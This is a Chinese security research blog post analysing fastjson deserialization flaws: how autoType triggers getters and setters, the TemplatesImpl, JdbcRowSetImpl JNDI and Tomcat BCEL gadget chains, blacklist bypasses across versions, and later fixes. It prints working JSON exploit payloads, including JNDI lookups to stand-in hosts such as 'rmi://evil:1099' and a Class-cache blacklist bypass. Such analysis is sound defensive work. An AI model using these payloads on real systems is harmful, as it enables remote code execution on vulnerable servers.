---
title: 浅谈fastjson反序列化漏洞
tags: 
  - vul
categories: notes
date: 2020-04-13 16:31:09
typora-root-url: ../../../source
---

# 0x00 前言

最近又碰上了fastjson的题目，想着是时候分析一波这个漏洞了，跟上师傅们的脚步。

<!-- more -->

# 0x01 基础知识

---

## (1). fastjson的基础使用

> fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。

先来看一个简单的例子

```java
public class Phone {

    public String phoneNumber;

    public Phone() {
    }

    public Phone(String phoneNumber) {
        this.phoneNumber = phoneNumber;
    }
		@Override
    public String toString(){
        return this.phoneNumber;
    }
}

public class NewPhone extends Phone {
    public String location;

    public NewPhone(){
    }

    public NewPhone(String phoneNumber, String location) {
        this.phoneNumber = phoneNumber;
        this.location = location;
    }

    @Override
    public String toString(){
        return this.phoneNumber+":"+this.location;
    }
}

public class Person {

    public String name;

    public Phone phone;

    public Person() {
    }

    public Person(String name, Phone phone) {
        this.name = name;
        this.phone = phone;
    }

    @Override
    public String toString(){
        return name+":"+phone;
    }
}
```

上面包括了3个简单的对象Person、Phone以及NewPhone，我们用fastjson将Person对象转化成一个json字符串，并还原

```java
Phone phone = new Phone("1234567890");
Person person = new Person("john", phone);
String json = JSON.toJSONString(person);
System.out.println(json);
Person p = JSON.parseObject(json, Person.class);
System.out.println(p);
// output 
// {"name":"john","phone":{"phoneNumber":"1234567890"}}
// john:1234567890
```

调用fastjson的toJSONString可以轻易地将object转化为json字符串，也可以用parseObject将json字符串还原出来。但是这里有一个限制就是

```java
Phone phone = new NewPhone("1234567890","China");
Person person = new Person("john", phone);
String json = JSON.toJSONString(person);
System.out.println(json);
Person p = JSON.parseObject(json, Person.class);
System.out.println(p);
// output
// {"name":"john","phone":{"location":"China","phoneNumber":"1234567890"}}
// john:1234567890
```

在上面的写法中，由于fastjson不知道需要还原的Person的Phone是本身还是子类NewPhone，面对这种多态方式，fastjson还原是父类，而不是子类NewPhone。这意味着我们丢失了Json字符串中phone的location字段。这显然是不可忍受的，所以fastjson给我们提供了指定还原类的字段`@type`方法

```java
Phone phone = new NewPhone("1234567890","China");
Person person = new Person("john", phone);
String json = JSON.toJSONString(person, SerializerFeature.WriteClassName);
System.out.println(json);
Person p = JSON.parseObject(json, Person.class);
System.out.println(p);
// output
// {"@type":"org.vultest.base.Person","name":"john","phone":{"@type":"org.vultest.base.NewPhone","location":"China","phoneNumber":"1234567890"}}
// john:1234567890:China
```

通过在toJSONString的时候指定SerializerFeature（SerializerFeature.WriteClassName），使得转化后的json字符串多了`@type`字段。这个字段指代了当前类的class，避免了上面的子类丢失字段的问题。比如上面直接指定了Person对象的phone属性的类是NewPhone，还原后成功打印出location。

到了这里，我们可以思考一下，如果`@type`被指定为某恶意的类，是否会导致任意代码执行的漏洞？

## (2).fastjson的流程简介

> 这里直接参考https://paper.seebug.org/994/

用一下廖大的流程图

![img](/images/talk-about-fastjson-deserialization-20200413/1564368830000-15632616584384.jpg)

具体的分析过程看上面的那篇文章即可，这里提一下将ASM动态生成的代码dump出来的方法

在分析过程中，ASM动态生成了相应的bytecodes，这里用idea的断点来dump源码

先将断点下在`com/alibaba/fastjson/parser/deserializer/ASMDeserializerFactory.java#80`

![image-20200104200324167](/images/talk-about-fastjson-deserialization-20200413/image-20200104200324167.png)

生成的bytecodes在code里，用执行表达式的功能，执行`(new FileOutputStream("some.class")).write(code)`即可生成

![image-20200104200849550](/images/talk-about-fastjson-deserialization-20200413/image-20200104200849550.png)

## (3).  fastjson 自动调用getter和setter

类似Java的反序列化过程会自动调用readObject函数，fastjson还原对象时也会自动调用以下几个函数：

* 无参数的构造函数
* 符合条件的getter函数
* 符合条件的setter函数

这里需要区别的是fastjson所使用的parse函数和parseObject函数所调用的函数条件是不一样的。（ps：序列化时会调用所有getters）

### 1. parse 和 parseObject的区别

来看一下parseObject函数

![image-20200409201548997](/images/talk-about-fastjson-deserialization-20200413/image-20200409201548997.png)

这里parseObject函数会首先调用`JSON.parse`函数，然后再去调用`toJSON`函数。

这里`toJSON`会把obj套一层`JSONObject`对象，他的实现方法是先new一个`JSONObject`，把obj对象给填充进去；然后调用`toJSONString`把生成的`JSONObject`转化为json字符串；最后再调用`parse`函数将这个json字符串给还原。

这里的`toJSONString`是我们序列化的一个过程，他会去调用这个对象的所有getters，也就意味着`parseObject`函数会主动去调getters和setters，而`parse`函数则会调用这个对象的setters和符合条件的getters(这部分见后文)。

那么也就意味着，`parseObject`比`parse`函数多了一个调用所有getters的利用点。

### 2. parse自动调用函数的主要逻辑

接着我们来看一下`JSON.parse`函数自动调用getters和setters的逻辑。

先来看一下调用流程，以下分析fastjson版本1.2.24

`com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.java#deserialze`（ps：这里很鸡贼的把deserialize的i给省略了）

![image-20200106094637943](/images/talk-about-fastjson-deserialization-20200413/image-20200106094637943.png)

首先是第570行调用了createInstance函数，该函数将会对当前还原的类进行实例化，这里会自动调用无参数的构造函数

其次是第600行调用了parseField函数，该函数将对每个类属性进行初始化(或递归生成新的对象)

跟进parseField函数

![image-20200106105841139](/images/talk-about-fastjson-deserialization-20200413/image-20200106105841139.png)

这里调用了`com/alibaba/fastjson/parser/deserializer/DefaultFieldDeserializer.java#parseField`函数，直接看关键点第83行，调用了setValue函数

![image-20200106110005828](/images/talk-about-fastjson-deserialization-20200413/image-20200106110005828.png)

setValue函数就是fastjson自动调用getter和setter的关键点

![image-20200106110837420](/images/talk-about-fastjson-deserialization-20200413/image-20200106110837420.png)

如果不存在相应的getter、setter、is函数，则利用反射机制将value赋值到当前的object上（这里就是else部分做的事情）。

而当fieldInfo存在函数时，如果同时存在getter和setter，则调用setter，如果只存在getter则调用getter。

这里我们关注一下fieldInfo的method是怎么填充的呢？这里要看`com/alibaba/fastjson/util/JavaBeanInfo.java#build`函数，ParserConfig在`createJavaBeanDeserializer`函数中会调用`JavaBeanInfo.build`函数，以此填充fieldInfo，也就是我们需要分析的几个method。

不看具体的代码，写一下筛选的条件：

setter提取条件：

* 函数名长度大于等于4
* 非静态函数
* 限制返回类型为void或当前类
* 函数参数只有一个
* 函数名以set开头，第四个字符是大写或者`unicde`或者`_`或者字母f；如果函数名长度>=5，看第5位字符是不是大写的

getter提取条件：

* 函数名长度大于等于4
* 非静态函数
* 函数名以get开头，第四个字符大写
* 函数参数为0个
* 函数的返回类型为Collection的子类或本身、Map的子类或本身、AtomicBoolean、AtomicInteger、AtomicLong
* 无相对应的setter函数

经过上述的两个条件提取后，保留了符合条件的getter和setter，并于`com/alibaba/fastjson/parser/deserializer/FieldDeserializer.java#setValue`函数中invoke调用，也就是说实现了类似反序列化过程中主动调用readObject函数的效果。

知道了上述的条件，其实我们可以利用传入某字段的方式来主动调用相关符合条件的setter和getter。例如在Person里面添加一个setTest函数，并在需要转化的json中添加`"test":1`，将会主动调用`setTest`。

我们在利用`@type`构造有危害的利用链时，主要就是查找有危害的无参数的构造函数、符合条件的getter和setter。

### 3. 突破parse不能调用所有getters的限制

这里的突破思路主要有两个：

1. tomcat bcel的poc
2.  threedream师傅发现的[引用](https://github.com/threedr3am/learnjavabug/commit/ea61297cf7b2125ecae0064d2b8061a9e32db1e6)的方式

#### 第一种：Tomcat BCEL POC思路

这个poc巧妙的利用了`JSONObject.toString`函数，先来看看这个`toString`

这个`toString`继承自`JSON`

![image-20200410110654354](/images/talk-about-fastjson-deserialization-20200413/image-20200410110654354.png)

这里他直接调用了`toJSONString`函数

![image-20200410110738399](/images/talk-about-fastjson-deserialization-20200413/image-20200410110738399.png)

看到后续他将当前这个JSONObject实例进行了obj to str的操作，也就是我们使用静态函数`JSON.toJSONString`来序列化数据一样，这里将会调用当前这个类的所有符合条件的getters（这里的条件比调用parse时宽松，他对返回类型无限制）。

那么我们只要在反序列化过程中，找到一处可以使用JSONObject调用toString的地方就可以了

`com/alibaba/fastjson/parser/DefaultJSONParser.java#parseObject`

![image-20200410121100651](/images/talk-about-fastjson-deserialization-20200413/image-20200410121100651.png)

这里有一处如果当前object为JSONObject类型时，将会对当前的这个key调用`toString`函数。这里在处理过程中，我们可以知道如果遇到`{`，fastjson会加一层JSONObject。

![image-20200410122509759](/images/talk-about-fastjson-deserialization-20200413/image-20200410122509759.png)

那么，我们只需要构造一个类似

```json
{{some}:x}
```

这种方式，此时的key为`{}`(也就是下一层的JSONObject)，value为`x`。我们就可以使得fastjson去调用`key.toString`函数，这个`toString`的过程也就是将key调用`toJSONString`的过程，意味着将会调用当前key对象的所有getters。到这里我们就可以使parse函数拥有与parseObject一样的执行效果，以下面的poc为例。

```json
{// 第一层JSONObject，他的key为另外一个JSONObject
		{// 下一层JSONObject，他的内容将会调用toJSONString
			"x":{// 具体触发点为getConnection
				"@type": "org.apache.tomcat.dbcp.dbcp.BasicDataSource",
				"driverClassLoader": {"@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"},		
        "driverClassName": "$$BCEL$$$l$8b$I$A$..."
         }
     }:"x"
};
```

#### 第二种：`$ref`点

当fastjson版本>=1.2.36时，我们可以使用`$ref`的方式来调用任意的getter

以1.2.48版本为例，首先看一下遇到`$ref`是怎么处理的

`com.alibaba.fastjson.parser.DefaultJSONParser#parseObject#388`

![image-20200411145506512](/images/talk-about-fastjson-deserialization-20200413/image-20200411145506512.png)

当遇到引用`$ref`这种方式，会增加一个resolveTask，留在parse结束后进行处理

`com.alibaba.fastjson.parser.DefaultJSONParser#handleResovleTask`

![image-20200411145811138](/images/talk-about-fastjson-deserialization-20200413/image-20200411145811138.png)

调用`JSONPath.eval`，关于JSONPath的[介绍](https://github.com/alibaba/fastjson/wiki/JSONPath)

这里的eval函数最终会去调用`JSONPath.getPropertyValue`函数（这里其实是可以根据我们传入的内容去调用不同的Segement，比如这里用了**$.value**的方式使用的是PropertySegement）

![image-20200411153340074](/images/talk-about-fastjson-deserialization-20200413/image-20200411153340074.png)

后续就不详细分析了，这里如果存在相应的getter，就会去invoke这个函数；如果没有，那么就会用反射机制去获取属性的值。

这里举个例子

```java
json = "{" +
          "\"@type\": \"org.apache.tomcat.dbcp.dbcp.BasicDataSource\"," +
          "\"driverClassLoader\": {\"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"}," +
          "\"driverClassName\": \"$$BCEL$$$l$8b$I$A$...\"," +
          "\"connection\":{\"$ref\": \"$.connection\"}"+
				"}";
```

会去调用`getConnection`函数，这里也突破了parse到parseObject的效果

## (4). private属性

还有一点需要注意的是默认fastjon在转化时，如果没有setter函数，而是以反射机制来赋值的情况，会忽略private属性的转化。意味着如果我们在构造过程中，填充进去的属性是private的且没有setter，那么在转化过程中是不会被填入还原后的对象的。如果需要对private属性进行转化，那么需要设置`Feature.SupportNonPublicField`

# 0x02 EXP分析

---

相比于Java反序列化利用链构造的复杂性，fastjson利用链主要是寻找可利用的getter、setter等，常见的几种POC如下文所示：

## (1). templatesimpl

参考：[http://xxlegend.com/2017/05/03/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/](http://xxlegend.com/2017/05/03/title- fastjson 远程反序列化poc的构造和分析/)

根据前面的分析，我们需要找到可以利用的构造函数、setter或getter函数。在分析Commons-Collections系统的利用链时，提到过templatesimpl的执行方式，通过载入bytecodes的方式来达到任意代码执行的效果(具体不再分析)。

其中触发载入的函数为`newTransformer`函数，而很巧的是，templatesimpl存在一个getter调用了该函数

![image-20200106232029570](/images/talk-about-fastjson-deserialization-20200413/image-20200106232029570.png)

那么很明显，我们可以直接填入`outputProperties`的方法来触发`getOutputProperties`（他恰巧无setter，返回值也符合条件）。但是有一个问题是我们需要填充的类属性都是private类型，要想执行该利用链，需要在调用parseObject函数时填入`Feature.SupportNonPublicField`。以下图为例，将调用计算器

```java
String jsonString = "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"," +
        "\"_name\":\"goodjob\",\"_tfactory\":{}," +
        "\"_bytecodes\":[\"yv66vgAAADQAOgoAA...\"]," +
        "\"_outputProperties\":null}";
```

这里的bytecodes可以用ysoserial工具来生成。在构造payload的时候，需要注意的是`_tfactory`必须填上，因为在执行过程中，如果它为null，会报错无法进入载入bytecodes的步骤。非常好的是，我们只要填上`_tfactory:{}`，fastjson会自动帮我们调用TransformerFactoryImpl（_tfactory的类）的无参构造函数进行实例化。`\_`在smartMatch函数被替换为空。

除此之外，byte[]类型在fastjson转化中会被base64编码

![image-20200106233142450](/images/talk-about-fastjson-deserialization-20200413/image-20200106233142450.png)

所以payload中是一长串base64的字串。

可以看到这个poc其实限制还是挺大的，需要fastjson parseObject时填上`Feature.SupportNonPublicField`才可以。

## (2). 基于JNDI的利用

我们都知道如果JNDI的lookup函数参数值可控，那么我们可以利用JNDI Reference的方法加载远程代码达成RCE利用。所以根据前面的分析，如果我们可以在`无参构造函数`、`符合条件的setter`、`符合条件的getter`里发现一个可控的lookup函数，我们就可以利用JNDI的注入方法来达成利用。

### JdbcRowSetImpl

JdbcRowSetImpl对象可以被我们用做上述的利用，来看一下他的代码

![image-20200407105109680](/images/talk-about-fastjson-deserialization-20200413/image-20200407105109680.png)

这次出问题的地方在于setAutoCommit函数，该函数调用了connect函数来重新发起一个jdbc的连接

![image-20200407105258958](/images/talk-about-fastjson-deserialization-20200413/image-20200407105258958.png)

在connect函数里我们可以看到调用了lookup函数，其参数值由`getDataSourceName`来获取，该函数主要返回属性`dataSource`，根据fastjson的利用原理，我们只需要填充`dataSource`和`autoCommit`就可以触发这里的JNDI注入。

```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://evil:1099/test","autoCommit":true}
```

还有很多其他的可以用来JNDI注入的对象，比如`org.hibernate.jmx.StatisticsService`的`setSessionFactoryJNDIName`函数，原理一样不再叙述。

## (3). Tomcat dbcp BasicDataSource

同1中的TemplateImpl，BasicDataSource也可以载入任意的对象来执行任意代码。先来讲一下他的原理

前面的基础知识里提到了我们可以调用符合条件的getters，在`BasicDataSource`存在一个`getConnection`函数，他主要调用`createConnectionFactory`

![image-20200411132559759](/images/talk-about-fastjson-deserialization-20200413/image-20200411132559759.png)

在`createConnectionFactory`函数使用Class.forName加载类

![image-20200411132736300](/images/talk-about-fastjson-deserialization-20200413/image-20200411132736300.png)

这部分driverClassName和driverClassLoader是可控的，这时候我们要用到的是`com.sun.org.apache.bcel.internal.util.ClassLoader`，这个ClassLoader可以从classname中提取出BCEL格式的class字节码，并调用defineClass进行载入

![image-20200411134429055](/images/talk-about-fastjson-deserialization-20200413/image-20200411134429055.png)

这里我们可以写一个用了静态块的类来执行代码。

# 0x03 Fastjson历史版本修复措施

---

这一部分主要讲述几个重要版本的安全更新

### (1). fastjson == 1.2.25

默认关闭`AutoType`，需要手动开启`@type`的支持，见[enable_autotype](https://github.com/alibaba/fastjson/wiki/enable_autotype)

`com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)`

![image-20200411232403665](/images/talk-about-fastjson-deserialization-20200413/image-20200411232403665.png)

当遇到`@type`时，会先`com.alibaba.fastjson.parser.ParserConfig#checkAutoType`。该函数的一个主要逻辑（1.2.25版本）

1. 开启了`AutoType`时，会过一次黑名单和白名单检测（先检测白名单，后检测黑名单）。

   ![image-20200412223524510](/images/talk-about-fastjson-deserialization-20200413/image-20200412223524510.png)

   优先载入人工配置的白名单类，并对黑名单类爆出异常；

2. 这里先忽略未开启`AutoType`时的检测处理

3. 前面的情况都不符合，并且开启了`AutoType`，则尝试去载入任意类，但是不可以载入ClassLoader和DataSource的子类

   ![image-20200412224904669](/images/talk-about-fastjson-deserialization-20200413/image-20200412224904669.png)

这里载入的方法用的都是`TypeUtils.loadClass`，来看一下他的一个处理

* 首先他对于`Lxxx.class.xxx;`的类表示方法做`L`,`;`的剔除，递归调用loadClass去调用内部的具体类

  ![image-20200412232825982](/images/talk-about-fastjson-deserialization-20200413/image-20200412232825982.png)

* 后续的调用方法为使用`AppClassLoader.loadClass`或`Class.forName`去加载类

#### 开启`AutoType`的情况下绕过黑名单检测

根据上面的分析，如果开启了`AutoType`，那么如果是在白名单里的类，直接加载，对于在黑名单内的类直接抛出异常。

而黑名单的检测方式是去匹配当前的类名`class.startsWith(deny)`

![image-20200412233730761](/images/talk-about-fastjson-deserialization-20200413/image-20200412233730761.png)

而在这个黑名单里显然并没有考虑到`TypeUtils.loadClass`实现中，对于`Lxxxx.class.xxx;`的处理。

通过`Lxxxxx;`的方式`startsWith`没办法正常匹配出来，所以我们可以绕过黑名单的检测。

### (2). fastjson == 1.2.42

在这个版本，对上面的黑名单检测绕过做了修复，并且将黑名单里的类型进行hash处理，增加了分析难度；

对于前面`Lxxxxx;`的绕过，42版本添加了以下代码来剔除（因为黑名单已经变成了hash比较的方式，这里`L;`都以这种方式来确认）

![image-20200413114125856](/images/talk-about-fastjson-deserialization-20200413/image-20200413114125856.png)

但是这里的处理治标不治本，我们使用`LLxxxxx;;`这种方式就可以绕过。

除此之外，由于现在的黑名单变成了hash计算的方式，给我们分析增加了不少难度，不过有大佬对黑名单hash做了还原见[fastjson-blacklist](https://github.com/LeadroyaL/fastjson-blacklist)

### (3). fastjson == 1.2.43

这个版本主要修复了上面`LLxxxx;;`的方式

![image-20200413125108171](/images/talk-about-fastjson-deserialization-20200413/image-20200413125108171.png)

做了两次检测，如果碰上`LLxxxxx;;`的方式则直接爆出异常

### (4). fastjson == 1.2.48

#### 修复前的版本

在48版本之前，`checkAutoType`还存在这样一个逻辑（以1.2.47为例）

![image-20200413130933666](/images/talk-about-fastjson-deserialization-20200413/image-20200413130933666.png)

当开启`AutoType`时，如果mappings里面存在这个类，那么就算这个类在黑名单里，也允许他进行下一步操作

PS：这里的mappings是fastjson提早载入的一些缓存类

![image-20200413131026571](/images/talk-about-fastjson-deserialization-20200413/image-20200413131026571.png)

后续如果能从mappings里面得到这个类，就直接返回。那么我们有没有什么方法将我们需要的类加入到这个mappings里呢？

先来看一下`deserializers.findClass`，在`deserializers`里面预先填充了一些类与其反序列化器的实例

![image-20200413131650373](/images/talk-about-fastjson-deserialization-20200413/image-20200413131650373.png)

这里我们主要关注一下`Class.class`，他所对应的反序列化器为`MiscCodec`，`checkAutoType`检测过后，后续将调用反序列化器的`deserialze`函数。来看看MiscCodec的这个函数对于`Class.class`的处理

![image-20200413132337804](/images/talk-about-fastjson-deserialization-20200413/image-20200413132337804.png)

他调用了`TypeUtils.loadClass`函数，前面我们讲过，他将使用`ClassLoader.loadClass`或`Class.forName`来载入类，在这一过程中，涉及到了`mappings`的操作

![image-20200413132644597](/images/talk-about-fastjson-deserialization-20200413/image-20200413132644597.png)

![image-20200413132704804](/images/talk-about-fastjson-deserialization-20200413/image-20200413132704804.png)

这里的`cache`默认为`true`，所以这里会直接将载入后的对象填入`mappings`

根据我们前面的分析，如果当前`mappings`里存在可控的类，那么不管开没开启`AutoType`，都会进行类还原；同时我们利用`Class.class`可以向`mappings`填充任意类，这导致绕过了前面的检测；

```java
// 举个例子
json = "{" + // 用Class载入com.sun.rowset.JdbcRowSetImpl，并缓存到mappings
          "{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"}," +
  					// 后续使用mappings里的com.sun.rowset.JdbcRowSetImpl来还原对象
          "{\"@type\": \"com.sun.rowset.JdbcRowSetImpl\"," +
          "\"dataSourceName\": \"ldap://localhost:1389/Exploit\"," +
          "\"autoCommit\": true}" +
        "}";
```

#### 修复后的版本

在1.2.48版本上对其进行了修复

在`MiscCodec`对Class的处理中，修改了`cache=false`

![image-20200413134143022](/images/talk-about-fastjson-deserialization-20200413/image-20200413134143022.png)

并且对于`TypeUtils.loadClass`里的`mappings`操作都依赖于`cache`，如果为`false`则不添加到`mappings`里（在前面的版本里`Class.forName`部分并不依赖cache，48版本之后增加了对cache的判断）

与此同时，`java.lang.Class`也被加入到了黑名单里面

### (5). 后续版本

后续版本的绕过主要围绕在：

* 开启`AutoType`，绕过黑名单检测
* 利用`deserializers`里面的类(跟`Class.class`一个原理)

最新版1.2.68引入了[safeMode](https://github.com/alibaba/fastjson/wiki/fastjson_safemode)，在`checkAutoType`里添加了下面判断，如果开启了safemode，那么将不允许进行`@type`

![image-20200413161935377](/images/talk-about-fastjson-deserialization-20200413/image-20200413161935377.png)

不过这个并不是默认开启的，需要人工去配置。

### (6). 后续版本觉得有意思的利用

* fastjson < 1.2.60 dos [Fastjson-1-2-60-Dos](http://m0d9.me/2019/09/06/Fastjson-1-2-60-Dos分析/)

* 使用dnslog来检测fastjson漏洞 https://github.com/alibaba/fastjson/issues/3077

  这里的原理跟`Class.class`是一样的，只是换成了`java.net.URL`、`java.net.Inet4Address`、`java.net.Inet6Address`，由MiscCodec处理时会去触发dns查询

  当然这里的触发URL的触发用的ysoserial里面的URLDNS的方式，由hashcode去触发；

  ```
  {"@type":"java.net.Inet4Address","val":"dnslog"}
  {"@type":"java.net.Inet6Address","val":"dnslog"}
  {{"@type":"java.net.URL","val":"http://s81twxdise25yxjinqaar74iq9wzko.burpcollaborator.net"}:"aaa"}
  ```

# 0x04 总结

---

到这里fastjson相关的知识点就梳理结束了，这其中开发者与安全研究人员的攻防交互真是令人称快！后续如果有其他的绕过，还会继续写下去。

总结一下fastjson利用中的特色：

* 反序列化时主动触发符合条件的setters和getters，其中使用parse和parseObject函数，在getter利用上parseObject的限制更低一点；但是这里我们可以利用本文的两种方法将parse的调用效果转化为parseObject
* `com.sun.org.apache.bcel.internal.util.ClassLoader`是个好东西
* fastjson的黑名单绕过来看，基本上找的都是jndi相关的利用，或许可以扩展一些其他的？
* 有时候开发者理解不到位，打得补丁可以轻松被绕过，所以需要紧盯补丁的情况